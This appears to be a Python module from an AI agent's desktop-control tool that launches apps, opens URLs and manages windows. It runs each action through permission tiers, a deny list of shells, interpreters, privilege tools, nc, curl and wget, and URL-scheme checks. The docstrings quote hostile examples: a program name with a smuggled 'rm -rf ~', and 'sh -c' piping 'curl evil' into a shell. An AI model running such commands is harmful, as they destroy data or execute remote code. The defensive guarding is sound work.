"""Apps, URLs and windows.

``launch_app`` takes a program name, never a command line: it is exec'd with a
fixed argv so a name like ``"firefox; rm -rf ~"`` is looked up as a program
called exactly that, fails, and never reaches a shell. Anything that genuinely
needs shell semantics is ``run_command``, which is Tier 3 for that reason.

That is not enough on its own, and the two guards below are the reason:

* **Arguments turn a launcher into an exec primitive.** ``launch_app`` with
  ``{"app": "sh", "args": ["-c", "..."]}`` is ``run_command`` wearing a hat, and
  a bare Tier-1 ``launch_app`` would hand the server everything the Tier-3 shell
  gate exists to withhold. So :meth:`LaunchApp.tier_for` raises the tier to
  CONFIRM the moment any argument is present: launching an app is Tier 1,
  *driving* one is not. The prompt then shows the exact argv.
* **Some program names are never "an app".** Interpreters, privilege tools and
  power commands are refused outright, with or without arguments, because
  ``launch_app poweroff`` needs no argument to be a bad afternoon. Like the
  shell denylist this is a tripwire rather than containment — the tier is the
  boundary — but it costs nothing and catches the obvious.
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
from typing import Any, Mapping
from urllib.parse import urlsplit

from ..policy import ActionTier
from .base import Action, ActionContext, ActionResult
from .system import _ps_single_quote, _run

__all__ = ["LaunchApp", "OpenUrl", "ListWindows", "FocusWindow"]

#: A program name, not a command line. No spaces, no separators, no shell
#: metacharacters — those are the shapes that only make sense to an interpreter.
_APP_NAME = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._+@-]{0,127}$")

#: Programs that are not applications in any sense a user means when they say
#: "open X": language interpreters and shells (an exec primitive), privilege
#: tools (a way to become someone else), script hosts (the Windows spelling of
#: the same), and the power commands (destructive with no arguments at all).
#: ``run_command`` exists for these, and it is Tier 3.
_REFUSED_PROGRAMS = frozenset(
    {
        # shells
        "sh", "bash", "zsh", "dash", "ksh", "csh", "tcsh", "fish", "ash", "busybox",
        "cmd", "command", "powershell", "pwsh", "powershell_ise",
        # interpreters
        "python", "python2", "python3", "pythonw", "perl", "ruby", "node", "deno",
        "bun", "php", "lua", "luajit", "tclsh", "wish", "awk", "gawk", "mawk",
        "sed", "expect", "osascript",
        # things whose job is to run something else
        "env", "xargs", "find", "nohup", "setsid", "timeout", "watch", "at",
        "crontab", "make", "screen", "tmux", "script",
        # script hosts and LOLBins
        "wscript", "cscript", "mshta", "rundll32", "regsvr32", "msiexec",
        "certutil", "bitsadmin", "installutil", "regasm",
        # privilege
        "sudo", "doas", "su", "pkexec", "runas", "chroot", "gsudo",
        # remote shells and downloaders
        "ssh", "scp", "sftp", "telnet", "nc", "ncat", "netcat", "socat",
        "curl", "wget",
        # power and service control: destructive with no arguments
        "shutdown", "reboot", "halt", "poweroff", "init", "systemctl",
        "launchctl", "service", "loginctl",
        # debuggers can attach to and drive any other process
        "gdb", "lldb", "strace", "ltrace", "dtrace",
    }
)


def _program_key(app: str) -> str:
    """The name we match against :data:`_REFUSED_PROGRAMS`.

    Lowercased and stripped of the suffixes that name the same program on a
    different platform, so ``PowerShell.exe`` and ``powershell`` are one entry.
    """
    name = app.strip().lower()
    for suffix in (".exe", ".com", ".bat", ".cmd", ".app", ".desktop"):
        if name.endswith(suffix):
            name = name[: -len(suffix)]
            break
    return name


def _launch_args(params: Mapping[str, Any]) -> list[str]:
    """The ``args`` parameter as a list of strings. Shared by :meth:`tier_for`
    and :meth:`run` so the tier is decided from exactly what will be exec'd."""
    raw = params.get("args")
    if not isinstance(raw, (list, tuple)):
        return []
    return [str(a) for a in raw]


class LaunchApp(Action):
    id = "launch_app"
    tier = ActionTier.AUTO
    description = "Start an application on this machine by name."
    params_schema = {
        "app": "string: the program or .app/.desktop name, e.g. firefox, Safari, code",
        "args": "array of strings (optional): arguments passed to the program. "
        "Passing any argument makes this a Tier 3 action that asks every time.",
    }
    capability = "apps"
    timeout_s = 20.0

    def tier_for(self, params: Mapping[str, Any]) -> ActionTier:
        """Tier 1 to open an app; Tier 3 to hand it a command line.

        ``{"app": "sh", "args": ["-c", "curl evil|sh"]}`` is arbitrary code
        execution, and it must not be cheaper than ``run_command`` just because
        it is spelled differently. Raise only — the dispatcher takes the max.
        """
        return ActionTier.CONFIRM if _launch_args(params) else ActionTier.AUTO

    def run(self, ctx: ActionContext, params: dict[str, Any]) -> ActionResult:
        app = (self.str_param(params, "app") or "").strip()
        if not app:
            return ActionResult.failed("app is required")
        if not _APP_NAME.match(app):
            return ActionResult.failed(
                "app must be a plain program name (letters, digits, . _ + - @); "
                "use run_command for anything that needs shell syntax"
            )
        if _program_key(app) in _REFUSED_PROGRAMS:
            return ActionResult.denied(
                f"refused: {app} is an interpreter, a privilege tool or a power "
                "command, not an application. Use run_command, which shows you "
                "the exact command line and asks every time."
            )
        args = _launch_args(params)
        if any("\x00" in a for a in args):
            return ActionResult.failed("arguments must not contain null bytes")

        system = ctx.system
        if system == "Darwin":
            argv = ["open", "-a", app] + (["--args", *args] if args else [])
        elif system == "Windows":
            # Deliberately NOT `cmd /c start`: cmd re-parses the line it is
            # handed, so an argument containing `&`, `|` or `^` would start a
            # second program that the consent prompt never showed. Resolve the
            # program and exec it directly instead.
            resolved = shutil.which(app)
            if resolved:
                argv = [resolved, *args]
            elif not args and hasattr(os, "startfile"):
                try:
                    os.startfile(app)  # type: ignore[attr-defined] # noqa: S606
                except OSError as exc:
                    return ActionResult.failed(f"could not launch {app}: {exc}")
                return ActionResult.success(app=app, via="startfile")
            else:
                return ActionResult.failed(f"no program called {app} is on this machine's PATH")
        else:
            resolved = shutil.which(app)
            if resolved:
                argv = [resolved, *args]
            elif shutil.which("gtk-launch") and app.endswith(".desktop"):
                argv = ["gtk-launch", app, *args]
            else:
                return ActionResult.failed(f"no program called {app} is on this machine's PATH")

        try:
            # Detached: the app outlives the agent and its output goes nowhere.
            kwargs: dict[str, Any] = {
                "stdout": subprocess.DEVNULL,
                "stderr": subprocess.DEVNULL,
                "stdin": subprocess.DEVNULL,
            }
            if os.name == "posix":
                kwargs["start_new_session"] = True
            subprocess.Popen(argv, **kwargs)
        except FileNotFoundError:
            return ActionResult.failed(f"could not find {argv[0]}")
        except OSError as exc:
            return ActionResult.failed(f"could not launch {app}: {exc}")
        return ActionResult.success(app=app, argv=argv)


class OpenUrl(Action):
    id = "open_url"
    tier = ActionTier.AUTO
    description = "Open a web address in this machine's default browser."
    params_schema = {"url": "string: an http:// or https:// URL"}
    capability = "apps"
    timeout_s = 15.0

    #: Everything else — file:, javascript:, data:, smb:, vscode: — is a way to
    #: reach local state or another program's URL handler, so only the two web
    #: schemes are allowed. mailto: is deliberately absent: it drafts a message
    #: to another person, which is Tier 3 territory.
    ALLOWED_SCHEMES = ("http", "https")

    def run(self, ctx: ActionContext, params: dict[str, Any]) -> ActionResult:
        url = (self.str_param(params, "url") or "").strip()
        if not url:
            return ActionResult.failed("url is required")
        if any(ord(ch) < 0x20 or ord(ch) == 0x7F for ch in url):
            return ActionResult.failed("url contains control characters")
        try:
            parts = urlsplit(url)
        except ValueError:
            return ActionResult.failed("malformed url")
        if parts.scheme.lower() not in self.ALLOWED_SCHEMES:
            return ActionResult.failed(
                f"only {' and '.join(self.ALLOWED_SCHEMES)} URLs can be opened "
                f"(got {parts.scheme or 'no scheme'})"
            )
        if not parts.netloc:
            return ActionResult.failed("url has no host")

        import webbrowser

        try:
            opened = webbrowser.open(url, new=2, autoraise=True)
        except Exception as exc:  # noqa: BLE001
            return ActionResult.failed(f"could not open a browser: {exc}")
        if not opened:
            return ActionResult.failed("no browser is registered on this machine")
        return ActionResult.success(url=url)


class ListWindows(Action):
    id = "list_windows"
    tier = ActionTier.AUTO
    description = "List the open windows on this machine (title and application)."
    params_schema: dict[str, str] = {}
    capability = "apps"
    #: Above the 20s PowerShell deadline below: an action must not outlive the
    #: dispatcher's cap, or the server is told "timed out" while a thread runs on.
    timeout_s = 30.0

    def available(self, ctx: ActionContext) -> bool:
        if ctx.system == "Darwin":
            return ctx.which("osascript") is not None
        if ctx.system == "Windows":
            return ctx.which("powershell") is not None
        return ctx.which("wmctrl", "xdotool") is not None

    def unavailable_reason(self, ctx: ActionContext) -> str | None:
        if ctx.system == "Linux":
            return (
                "no window lister found; install wmctrl or xdotool "
                "(Wayland compositors may not expose window lists at all)"
            )
        return "this machine has no supported way to list windows"

    def run(self, ctx: ActionContext, params: dict[str, Any]) -> ActionResult:
        system = ctx.system
        if system == "Linux" and ctx.which("wmctrl"):
            code, out, err = _run(["wmctrl", "-l", "-p", "-x"])
            if code != 0:
                return ActionResult.failed(f"wmctrl failed: {err.strip() or code}")
            windows = []
            for line in out.splitlines():
                parts = line.split(None, 4)
                if len(parts) >= 5:
                    windows.append(
                        {"id": parts[0], "pid": parts[2], "wm_class": parts[3], "title": parts[4]}
                    )
            return _window_result(windows, "wmctrl")
        if system == "Linux" and ctx.which("xdotool"):
            code, out, _ = _run(["xdotool", "search", "--name", ".+"])
            if code != 0:
                return ActionResult.failed("xdotool could not enumerate windows")
            windows = []
            for wid in out.split()[:100]:
                _, name, _ = _run(["xdotool", "getwindowname", wid], timeout=3.0)
                windows.append({"id": wid, "title": name.strip()})
            return _window_result(windows, "xdotool")
        if system == "Darwin":
            script = (
                'tell application "System Events" to get {name, title of windows} '
                "of (every application process whose visible is true)"
            )
            code, out, err = _run(["osascript", "-e", script])
            if code != 0:
                return ActionResult.failed(f"osascript failed: {err.strip() or code}")
            return _window_result([{"raw": out.strip()}], "osascript")
        if system == "Windows":
            code, out, err = _run(
                [
                    "powershell",
                    "-NoProfile",
                    "-Command",
                    "Get-Process | Where-Object {$_.MainWindowTitle} | "
                    "Select-Object Id,ProcessName,MainWindowTitle | ConvertTo-Json -Compress",
                ],
                timeout=20.0,
            )
            if code != 0:
                return ActionResult.failed(f"powershell failed: {err.strip() or code}")
            return _window_result([{"raw": out.strip()}], "powershell")
        return ActionResult.unsupported(self.unavailable_reason(ctx) or "unsupported")


def _window_result(windows: list[dict[str, Any]], via: str) -> ActionResult:
    # Window titles are written by whatever is on screen — a web page's <title>
    # ends up here. Data, not instructions.
    return ActionResult.untrusted({"windows": windows[:200], "count": len(windows), "via": via})


class FocusWindow(Action):
    id = "focus_window"
    # Tier 2: it changes what has keyboard focus, which is recoverable but is
    # also the setup move for "type into the window that just came forward".
    tier = ActionTier.NOTIFY
    description = "Bring a window to the front by title or window id."
    params_schema = {
        "title": "string: a substring of the window title",
        "window_id": "string (optional): an id from list_windows",
    }
    capability = "apps"
    timeout_s = 15.0

    def available(self, ctx: ActionContext) -> bool:
        if ctx.system == "Darwin":
            return ctx.which("osascript") is not None
        if ctx.system == "Windows":
            return ctx.which("powershell") is not None
        return ctx.which("wmctrl", "xdotool") is not None

    def unavailable_reason(self, ctx: ActionContext) -> str | None:
        return "no window manager control found; install wmctrl or xdotool"

    def run(self, ctx: ActionContext, params: dict[str, Any]) -> ActionResult:
        window_id = (self.str_param(params, "window_id") or "").strip()
        title = (self.str_param(params, "title") or "").strip()
        if not window_id and not title:
            return ActionResult.failed("title or window_id is required")
        if window_id and not re.match(r"^[0-9a-zA-Zx]{1,32}$", window_id):
            return ActionResult.failed("window_id looks malformed")
        if len(title) > 200:
            return ActionResult.failed("title is too long")

        system = ctx.system
        if system == "Linux" and ctx.which("wmctrl"):
            argv = ["wmctrl", "-i", "-a", window_id] if window_id else ["wmctrl", "-a", title]
        elif system == "Linux" and ctx.which("xdotool"):
            argv = (
                ["xdotool", "windowactivate", window_id]
                if window_id
                else ["xdotool", "search", "--name", title, "windowactivate"]
            )
        elif system == "Darwin":
            argv = ["osascript", "-e", f'tell application "{_applescript_safe(title)}" to activate']
        elif system == "Windows":
            argv = [
                "powershell",
                "-NoProfile",
                "-Command",
                "$s = New-Object -ComObject WScript.Shell; "
                f"$s.AppActivate('{_ps_single_quote(title)}')",
            ]
        else:
            return ActionResult.unsupported(self.unavailable_reason(ctx) or "unsupported")

        code, _, err = _run(argv)
        if code != 0:
            return ActionResult.failed(f"could not focus that window: {err.strip() or code}")
        return ActionResult.success(focused=window_id or title)


def _applescript_safe(text: str) -> str:
    return re.sub(r'[^A-Za-z0-9 ._-]', "", text)[:80]
